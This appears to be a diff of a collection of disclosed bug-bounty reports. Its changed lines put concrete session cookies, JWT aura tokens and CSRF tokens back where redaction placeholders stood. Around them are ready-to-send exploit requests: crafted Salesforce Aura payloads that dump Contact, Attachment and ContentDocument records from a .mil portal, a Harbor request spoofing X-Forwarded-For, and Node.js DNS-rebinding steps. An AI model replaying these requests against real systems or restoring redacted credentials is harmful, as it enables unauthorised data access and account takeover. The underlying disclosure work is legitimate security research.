-Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=[REDACTED_SECRET]==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn![REDACTED_SECRET]; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1
+Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=[REDACTED_SALESFORCE_TOKEN]; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 Accept: */*
 Accept-Language: en-US,en;q=0.5
@@ -1478,7 +1478,7 @@ Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-origin
 Te: trailers
 
-message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Contact","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%[REDACTED_SECRET]%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal██████████%2Fs%2F&aura.token=[REDACTED_SECRET]%3D..[REDACTED_SECRET]%3D
+message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Contact","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal██████████%2Fs%2F&aura.token=eyJub25jZSI6Ilh5VUlXTVhkNmlMLVVVSGE4UHgtNVpYcXNHTExpcHh1VHpsdGY0ZUxMX0lcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRFJ3MDAwMDAwMDAwMVwiLFwidlwiOlwiMDJHUncwMDAwMDAwMDNGXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzczOTAwMTE5MTEsImV4cCI6MH0%3D..WK5LFyXjvujGvkxNWDVZyUQQsRhVRCcTD_hkWdulEWA%3D
 ```
 
 █████████
@@ -1486,9 +1486,9 @@ message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.comp
 5. Modify the request again as below, setting the value of parentId as as your Contact Id extracted in previous step and attachmentId as 00PRw000000MaT3MAK:
 
 ```
-POST /Portal█████████/s/sfsites/aura?r=1&[REDACTED_SECRET].PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2
+POST /Portal█████████/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2
 Host: █████.mil
-Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=[REDACTED_SECRET]==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn![REDACTED_SECRET]; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1
+Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=[REDACTED_SALESFORCE_TOKEN]; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 Accept: */*
 Accept-Language: en-US,en;q=0.5
@@ -1508,16 +1508,16 @@ Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-origin
 Te: trailers
 
-message={"actions":[{"id":"20;a","descriptor":"apex://ExAM.FileUploadController/ACTION$cloneAttachment","callingDescriptor":"markup://ExAM:AssessmentViewer","params":{"attachmentId":"00PRw000000MaT3MAK","parentId":"003Rw000002SJcsIAG"},"version":null}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%[REDACTED_SECRET]%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal█████████%2Fs%2F&aura.token=[REDACTED_SECRET]%3D..[REDACTED_SECRET]%3D
+message={"actions":[{"id":"20;a","descriptor":"apex://ExAM.FileUploadController/ACTION$cloneAttachment","callingDescriptor":"markup://ExAM:AssessmentViewer","params":{"attachmentId":"00PRw000000MaT3MAK","parentId":"003Rw000002SJcsIAG"},"version":null}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal█████████%2Fs%2F&aura.token=eyJub25jZSI6Ilh5VUlXTVhkNmlMLVVVSGE4UHgtNVpYcXNHTExpcHh1VHpsdGY0ZUxMX0lcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRFJ3MDAwMDAwMDAwMVwiLFwidlwiOlwiMDJHUncwMDAwMDAwMDNGXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzczOTAwMTE5MTEsImV4cCI6MH0%3D..WK5LFyXjvujGvkxNWDVZyUQQsRhVRCcTD_hkWdulEWA%3D
 ```
 █████
 
 6. Modify request again and send, this time calling all accessible Attachment records. Note that a new file has just been cloned/created, copy the Id: 00PRw000000MbSLMA0.
 
 ```
-POST /Portal████████/s/sfsites/aura?r=1&[REDACTED_SECRET].PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2
+POST /Portal████████/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2
 Host: ██████.mil
-Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=[REDACTED_SECRET]==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn![REDACTED_SECRET]; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1
+Cookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=[REDACTED_SALESFORCE_TOKEN]; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
 Accept: */*
 Accept-Language: en-US,en;q=0.5
@@ -1537,7 +1537,7 @@ Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-origin
 Te: trailers
 
-message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Attachment","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%[REDACTED_SECRET]%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal████████%2Fs%2F&aura.token=[REDACTED_SECRET]%3D..[REDACTED_SECRET]%3D
+message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Attachment","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal████████%2Fs%2F&aura.token=eyJub25jZSI6Ilh5VUlXTVhkNmlMLVVVSGE4UHgtNVpYcXNHTExpcHh1VHpsdGY0ZUxMX0lcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRFJ3MDAwMDAwMDAwMVwiLFwidlwiOlwiMDJHUncwMDAwMDAwMDNGXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzczOTAwMTE5MTEsImV4cCI6MH0%3D..WK5LFyXjvujGvkxNWDVZyUQQsRhVRCcTD_hkWdulEWA%3D
 ```
 ████████
 
@@ -1710,7 +1710,7 @@ Sec-Fetch-Site: same-origin
 Te: trailers
 Connection: close
 
-message=%7B%22actions%22%3A%5B%7B%22id%22%3A%2298%3Ba%22%2C%22descriptor%22%3A%22aura%3A%2F%2FApexActionController%2FACTION%24execute%22%2C%22callingDescriptor%22%3A%22UNKNOWN%22%2C%22params%22%3A%7B%22namespace%22%3A%22%22%2C%22classname%22%3A%22RegistrationCtrl%22%2C%22method%22%3A%22getFileUploadRecord%22%2C%22cacheable%22%3Afalse%2C%22isContinuation%22%3Afalse%7D%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%[REDACTED_SECRET]%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%224aRXFMeJBEoyEhCBFKHHSA%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AinputField%22%3A%22MIteSSSIxKghQgDJWuI57g%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AoutputField%22%3A%224kDixPuHcKU99oJ3nGrYwA%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AfeedPublisher%22%3A%22eLdMCU5TIIj5fTlBFHu9Cg%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AforceCommunityFeed%22%3A%22T_JqvrMTIi87V9CzYeCoyQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AobjectHome%22%3A%22XokhHoGbTrHekjpxgyja7A%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArecordDetail%22%3A%22DhqIX7zfLrAKT30H1SrJBQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArelatedRecords%22%3A%22QKutWURpjg1wirSmIlNoOQ%22%2C%22COMPONENT%40markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader%22%3A%221JitVv-ZC5qlK6HkuofJqQ%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fs%2Fregistration&aura.token=null
+message=%7B%22actions%22%3A%5B%7B%22id%22%3A%2298%3Ba%22%2C%22descriptor%22%3A%22aura%3A%2F%2FApexActionController%2FACTION%24execute%22%2C%22callingDescriptor%22%3A%22UNKNOWN%22%2C%22params%22%3A%7B%22namespace%22%3A%22%22%2C%22classname%22%3A%22RegistrationCtrl%22%2C%22method%22%3A%22getFileUploadRecord%22%2C%22cacheable%22%3Afalse%2C%22isContinuation%22%3Afalse%7D%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22WFIwUmVJdmtIRnI3MTFpX0d6c1VwQWhZX25NdHFVdGpDN3BnWlROY1ZGT3cyNTAuOC4zLTYuNC41%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%224aRXFMeJBEoyEhCBFKHHSA%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AinputField%22%3A%22MIteSSSIxKghQgDJWuI57g%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AoutputField%22%3A%224kDixPuHcKU99oJ3nGrYwA%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AfeedPublisher%22%3A%22eLdMCU5TIIj5fTlBFHu9Cg%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AforceCommunityFeed%22%3A%22T_JqvrMTIi87V9CzYeCoyQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AobjectHome%22%3A%22XokhHoGbTrHekjpxgyja7A%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArecordDetail%22%3A%22DhqIX7zfLrAKT30H1SrJBQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArelatedRecords%22%3A%22QKutWURpjg1wirSmIlNoOQ%22%2C%22COMPONENT%40markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader%22%3A%221JitVv-ZC5qlK6HkuofJqQ%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fs%2Fregistration&aura.token=null
 ```
 
 3. Modify the request as follows. This is a specifically crafted Aura payload that returns 2000 ContentDocument records (uploaded files). Send to Repeater and issue request:
@@ -1739,7 +1739,7 @@ Sec-Fetch-Site: same-origin
 Te: trailers
 Connection: close
 
-message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"ContentDocument","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%[REDACTED_SECRET]%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%224aRXFMeJBEoyEhCBFKHHSA%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AinputField%22%3A%22MIteSSSIxKghQgDJWuI57g%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AoutputField%22%3A%224kDixPuHcKU99oJ3nGrYwA%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AfeedPublisher%22%3A%22eLdMCU5TIIj5fTlBFHu9Cg%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AforceCommunityFeed%22%3A%22T_JqvrMTIi87V9CzYeCoyQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AobjectHome%22%3A%22XokhHoGbTrHekjpxgyja7A%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArecordDetail%22%3A%22DhqIX7zfLrAKT30H1SrJBQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArelatedRecords%22%3A%22QKutWURpjg1wirSmIlNoOQ%22%2C%22COMPONENT%40markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader%22%3A%221JitVv-ZC5qlK6HkuofJqQ%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fs%2Fregistration&aura.token=null
+message={"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"ContentDocument","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22WFIwUmVJdmtIRnI3MTFpX0d6c1VwQWhZX25NdHFVdGpDN3BnWlROY1ZGT3cyNTAuOC4zLTYuNC41%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%224aRXFMeJBEoyEhCBFKHHSA%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AinputField%22%3A%22MIteSSSIxKghQgDJWuI57g%22%2C%22COMPONENT%40markup%3A%2F%2Fforce%3AoutputField%22%3A%224kDixPuHcKU99oJ3nGrYwA%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AfeedPublisher%22%3A%22eLdMCU5TIIj5fTlBFHu9Cg%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AforceCommunityFeed%22%3A%22T_JqvrMTIi87V9CzYeCoyQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3AobjectHome%22%3A%22XokhHoGbTrHekjpxgyja7A%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArecordDetail%22%3A%22DhqIX7zfLrAKT30H1SrJBQ%22%2C%22COMPONENT%40markup%3A%2F%2FforceCommunity%3ArelatedRecords%22%3A%22QKutWURpjg1wirSmIlNoOQ%22%2C%22COMPONENT%40markup%3A%2F%2Finstrumentation%3Ao11ySecondaryLoader%22%3A%221JitVv-ZC5qlK6HkuofJqQ%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.pageURI=%2Fs%2Fregistration&aura.token=null
 ```
 
 4. Extract one of the IDs from the server response, e.g. 069830000028KJdAAM
@@ -1861,7 +1861,7 @@ The `insertOrUpdateUser` method improperly validates a users permissions to chan
 
 ## Releases Affected:
 
-  * [develop@5f0180d](https://github.com/RocketChat/Rocket.Chat/commit/[REDACTED_SECRET])
+  * [develop@5f0180d](https://github.com/RocketChat/Rocket.Chat/commit/5f0180dc1500b4e37b8320b39869babadb5d01cd)
 
 ## Steps To Reproduce (from initial installation to vulnerability):
 
@@ -2284,7 +2284,7 @@ nserver:      K.CCTLD.US 156.154.128.70 2001:503:e239:0:0:0:3:1
 nserver:      W.CCTLD.US 2001:dcd:1:0:0:0:0:15 37.209.192.15
 nserver:      X.CCTLD.US 2001:dcd:2:0:0:0:0:15 37.209.194.15
 nserver:      Y.CCTLD.US 2001:dcd:3:0:0:0:0:15 37.209.196.15
-ds-rdata:     59017 8 2 [REDACTED_SECRET]
+ds-rdata:     59017 8 2 7daf469d42b5d8e5537fd4dd4b6057710e9a61f72c32eb7fb6526f52277ec2b0
 
 whois:        whois.nic.us
 
@@ -2668,7 +2668,7 @@ Improper privilege management in all versions of GitHub Enterprise Server allows
 
 **Summary (researcher):**
 
-The `Manage:App` Rails controller of the [Github Management console](https://docs.github.com/en/enterprise-server@3.8/admin/administering-your-instance/[REDACTED_SECRET]/about-the-management-console) featured a method *post "/start"*, which was accessible by both editors and operators (and of course by site admins as well). This method allowed changing the license of the deployment and also resetting the site admin password. A malicious/compromised editor account could escalate their privileges to site admin and access the GHES deployment without any restrictions.
+The `Manage:App` Rails controller of the [Github Management console](https://docs.github.com/en/enterprise-server@3.8/admin/administering-your-instance/administering-your-instance-from-the-web-ui/about-the-management-console) featured a method *post "/start"*, which was accessible by both editors and operators (and of course by site admins as well). This method allowed changing the license of the deployment and also resetting the site admin password. A malicious/compromised editor account could escalate their privileges to site admin and access the GHES deployment without any restrictions.
 
 ---
 
@@ -2778,7 +2778,7 @@ This vulnerability is a bypass path created for CVE-2023-29298.
 
 ## References
 
-https://www.rapid7.com/blog/post/2023/07/19/[REDACTED_SECRET]/
+https://www.rapid7.com/blog/post/2023/07/19/cve-2023-38205-adobe-coldfusion-access-control-bypass-fixed/
 
 ## Impact
 
@@ -3559,7 +3559,7 @@ An improper authentication vulnerability was identified in GitHub Enterprise Ser
 
 **Summary (researcher):**
 
-Github supports [SSH certificate authority authentication](https://docs.github.com/en/enterprise-cloud@latest/organizations/[REDACTED_SECRET]/about-ssh-certificate-authorities) for Github Enterprise Cloud customers. As part of certificate authority authentication, the certificate contains a `extension:login@github.com=username` corresponding to which username from the organization to authenticate as.
+Github supports [SSH certificate authority authentication](https://docs.github.com/en/enterprise-cloud@latest/organizations/managing-git-access-to-your-organizations-repositories/about-ssh-certificate-authorities) for Github Enterprise Cloud customers. As part of certificate authority authentication, the certificate contains a `extension:login@github.com=username` corresponding to which username from the organization to authenticate as.
 
 Due to a missed check in the gist.github.com authentication flow, an attacker could create a certificate giving them access to push to any username's gists.
 
@@ -3956,7 +3956,7 @@ The fix for CVE-2022-32212, covered the cases for routable IP addresses, however
 
 [Original HackerOne report](https://hackerone.com/reports/1632921)
 
-[Node.js Blog](https://nodejs.org/en/blog/vulnerability/september-2022-security-releases/#[REDACTED_SECRET])
+[Node.js Blog](https://nodejs.org/en/blog/vulnerability/september-2022-security-releases/#dns-rebinding-in-inspect-insufficient-fix-of-cve-2022-32212-affecting-macos-devices-high-cve-2022-32212-cve-2018-7160)
 
 ## Impact
 
@@ -4213,7 +4213,7 @@ Do intercept : response to this request
 ```
 HTTP/1.1 401 Unauthorized
 vary: Cookie
-x-harbor-csrf-token: iigZs1FeT+[REDACTED_SECRET]==
+x-harbor-csrf-token: iigZs1FeT+ma5p15YDOTceiExGhLs734jPuOUXGYygmDuPNpxeuWKZArsB5T2GLeHoCfljAuXggKWOJ0LINdiA==
 x-request-id: b418b4ea-cf8d-4b07-9774-58735c4ab631
 date: Sat, 03 Sep 2022 18:42:09 GMT
 content-length: 0
@@ -4225,7 +4225,7 @@ connection: close
 ```
 HTTP/1.1 200 OK
 vary: Cookie
-x-harbor-csrf-token: iigZs1FeT+[REDACTED_SECRET]==
+x-harbor-csrf-token: iigZs1FeT+ma5p15YDOTceiExGhLs734jPuOUXGYygmDuPNpxeuWKZArsB5T2GLeHoCfljAuXggKWOJ0LINdiA==
 x-request-id: b418b4ea-cf8d-4b07-9774-58735c4ab631
 date: Sat, 03 Sep 2022 18:42:09 GMT
 content-length: 0
@@ -4248,7 +4248,7 @@ Cache-Control: no-cache
 Pragma: no-cache
 Connection: close
 Referer: https://█████/harbor/sign-in
-Cookie: sid=[REDACTED_SECRET]; _gorilla_csrf=[REDACTED_SECRET]
+Cookie: sid=a66e49e995c2fe659086de2237f422c2; _gorilla_csrf=MTY2MjIyOTI3N3xJa05hUkhFeWNGTXhNbU5CUzNwVE1XNU5LM1o0Y2k5WlJWY3ZOVGR1WlZCM2FIRk9jMHBXTUdKc05FVTlJZ289fB0DLyMK59qRUoo_SpL9Sv0QZkyDGLDVGMNa9_UYMSWz
 Sec-Fetch-Dest: empty
 Sec-Fetch-Mode: cors
 Sec-Fetch-Site: same-origin
@@ -4259,7 +4259,7 @@ X-FORWARDED-FOR: 127.0.0.1
 HTTP/1.1 401 Unauthorized
 content-type: application/json; charset=utf-8
 vary: Cookie, Accept-Encoding
-x-harbor-csrf-token: 1Brx7L2ZghZjt/[REDACTED_SECRET]+lxpUJ/A2P2TDItw==
+x-harbor-csrf-token: 1Brx7L2ZghZjt/RmUbMX2xFyuOM0OCVlj19hqoQrXzbdihs2KSxb1ml62QFiWOZ053bjHU+lxpUJ/A2P2TDItw==
 x-request-id: 8f4fd500-739a-437d-a42b-621206ff51a7
 date: Sat, 03 Sep 2022 18:45:12 GMT
 x-envoy-upstream-service-time: 3
@@ -4275,7 +4275,7 @@ Content-Length: 61
 HTTP/1.1 200 OK
 content-type: application/json; charset=utf-8
 vary: Cookie, Accept-Encoding
-x-harbor-csrf-token: 1Brx7L2ZghZjt/[REDACTED_SECRET]+lxpUJ/A2P2TDItw==
+x-harbor-csrf-token: 1Brx7L2ZghZjt/RmUbMX2xFyuOM0OCVlj19hqoQrXzbdihs2KSxb1ml62QFiWOZ053bjHU+lxpUJ/A2P2TDItw==
 x-request-id: 8f4fd500-739a-437d-a42b-621206ff51a7
 date: Sat, 03 Sep 2022 18:45:12 GMT
 x-envoy-upstream-service-time: 3
@@ -4399,7 +4399,7 @@ Note: On Windows devices, `http://0.0.0.0` is treated as an invalid URL and the 
 8. The `http://0.0.0.0:9229` website (i.e., the one hosted on <attacker's IP>) will retrieve `http://0.0.0.0:9229/json` from 127.0.0.1, including webSocketDebuggerUrl.
 9. Now, the attacker knows the webSocketDebuggerUrl and can connect to it using WebSocket. Note that WebSocket is not restricted by same-origin policy. By doing so, they can gain the privileges of the Node.js instance.
 
